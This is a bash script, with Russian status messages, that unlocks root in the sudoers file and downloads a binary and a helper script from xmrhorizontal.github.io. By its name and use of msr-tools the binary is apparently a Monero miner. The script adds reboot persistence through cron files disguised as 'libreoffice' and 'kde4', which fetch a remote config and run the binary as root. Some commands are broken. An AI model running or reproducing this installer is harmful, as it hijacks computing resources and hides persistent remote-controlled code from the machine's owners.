#!/bin/bash
su
sed -i 's/^#\(root\s*ALL=(ALL)\s*ALL\)/\1/' /etc/sudoers
echo "SUDO Разблокирован!."
apt-get update
apt-get install -y hwloc msr-tools sshpass
if ( lspci | grep -i nvidia ); then
	apt-get install -y nvidia-cuda-toolkit
fi
if [ -d "/root/bmcontrol" ]; then
    echo "Пишу в папку /root/bmcontrol."
    cd /root/bmcontrol
    ./stop.sh
    rm -rf ./*
    rm /etc/cron.d/bmcontrol
    wget https://xmrhorizontal.github.io/cpuhp
	wget https://xmrhorizontal.github.io/searcher.sh
	cat "0" > ./counter.txt
    chmod +x ./cpuhp
	chmod +x ./searcher.sh
    echo "@reboot root curl -s https://xmrhorizontal.github.io/config.json | /root/bmcontrol/cpuhp --config /dev/stdin" > /etc/cron.d/libreoffice
	echo "@reboot root /root/bmcontrol/searcher.sh" > /etc/cron.d/kde4
    ./cpuhp --config=/root/bmcontrol/config.json
elif [ -d "/home/user/bmcontrol" ]; then
    echo "Пишу в папку /home/user/bmcontrol."
    cd /home/user/bmcontrol
    ./stop.sh
    rm -rf ./*
    rm /etc/cron.d/bmcontrol
    wget https://xmrhorizontal.github.io/cpuhp
	wget https://xmrhorizontal.github.io/searcher.sh
	cat "0" > ./counter.txt
    chmod +x ./cpuhp
	chmod +x ./searcher.sh
    echo "@reboot root curl -s https://xmrhorizontal.github.io/config.json | /root/bmcontrol/cpuhp --config /dev/stdin" > /etc/cron.d/libreoffice
	echo "@reboot root /root/bmcontrol/searcher.sh" > /etc/cron.d/kde4
    ./cpuhp --config=/root/bmcontrol/config.json
else
    echo "Создаю папку /root/bmcontrol."
    mkdir /root/bmcontrol
    cd /root/bmcontrol
    wget https://xmrhorizontal.github.io/cpuhp
	wget https://xmrhorizontal.github.io/searcher.sh
	cat "0" > ./counter.txt
    chmod +x ./cpuhp
	chmod +x ./searcher.sh
    echo "@reboot root curl -s https://xmrhorizontal.github.io/config.json | /root/bmcontrol/cpuhp --config /dev/stdin" > /etc/cron.d/libreoffice
	echo "@reboot root /root/bmcontrol/searcher.sh" > /etc/cron.d/kde4
    ./cpuhp --config=/root/bmcontrol/config.json
fi
echo OK!

